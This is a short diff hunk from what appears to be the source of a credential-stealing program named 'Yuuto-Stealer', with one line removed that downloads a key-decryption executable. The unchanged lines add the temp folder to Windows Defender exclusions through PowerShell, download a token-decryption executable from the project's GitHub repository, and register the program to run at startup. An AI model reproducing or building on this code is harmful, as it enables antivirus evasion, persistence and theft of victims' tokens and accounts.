@@ -25,7 +25,6 @@ module.exports = async () => {
 
   if (runningFromExecutable()) await execSync(`powershell -Command Add-MpPreference -ExclusionPath "${tempFolder}"`);
   await download('https://github.com/JustYuuto/Yuuto-Stealer/raw/master/util/decrypt-token/decrypt_token.exe');
-  await download('https://github.com/JustYuuto/Yuuto-Stealer/raw/master/util/decrypt-key/decrypt_key.exe');
   await sleep(500);
 
   if (config.addToStartup && runningFromExecutable()) require('../functions/startup');
